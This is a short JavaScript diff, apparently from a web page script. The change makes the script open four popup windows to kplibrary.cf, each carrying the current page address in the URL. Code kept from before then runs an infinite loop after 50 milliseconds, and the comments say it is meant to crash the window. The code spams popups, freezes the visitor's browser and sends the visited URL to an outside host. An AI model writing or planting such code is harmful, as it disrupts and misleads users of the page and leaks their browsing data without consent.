@@ -6,9 +6,13 @@ if (popUp == null || typeof(popUp) == 'undefined') {
   }
 } else {
   window.open("http://kplibrary.cf/")
-  var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
-  var URL = "http://kplibrary.cf/" + location.href;
-  var win = window.open(URL, "_blank", strWindowFeatures);
+    //: Opens new tab of kplibrary.cf
+  for (var i = 0; i < 4; i++) {
+    //: This part opens kplibrary.cf 4 times 
+    var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
+    var URL = "http://kplibrary.cf/" + location.href;
+    var win = window.open(URL, "_blank", strWindowFeatures);
+  } //: Waits 50 miliseconds to crash the window
   setTimeout(function() {
     for (var i = 0; i === i; i++) {}
   }, 50);
